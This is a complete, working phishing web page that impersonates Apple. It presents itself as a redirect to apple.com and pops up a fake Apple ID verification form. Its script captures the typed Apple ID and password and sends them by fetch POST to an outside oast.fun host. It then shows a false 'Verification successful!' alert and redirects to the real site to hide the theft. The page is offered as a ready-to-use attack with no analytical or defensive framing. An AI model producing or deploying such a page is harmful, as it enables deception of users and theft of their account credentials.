<!DOCTYPE html>
<html>
<head>
  <title>Redirecting to Apple</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      text-align: center;
      padding-top: 100px;
    }

    #loginModal {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 350px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      padding: 30px;
      z-index: 9999;
    }

    #loginModal h2 {
      font-size: 18px;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
    }

    button {
      padding: 10px 20px;
      background-color: #0071e3;
      color: white;
      border: none;
      cursor: pointer;
    }

    #overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.3);
      z-index: 9998;
    }
  </style>
</head>
<body>

<h1>Click to continue to Apple</h1>
<button onclick="showLogin()">Go to Apple.com</button>

<div id="overlay"></div>
<div id="loginModal">
  <h2>Apple ID Verification Required</h2>
  <input type="text" placeholder="Apple ID" id="email" />
  <input type="password" placeholder="Password" id="pass" />
  <button onclick="submitLogin()">Sign In</button>
</div>

<script>
  function showLogin() {
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('loginModal').style.display = 'block';
  }

  function submitLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, pass })
    });

    alert("Verification successful!");
    window.location.href = 'https://apple.com';
  }
</script>

</body>
</html>
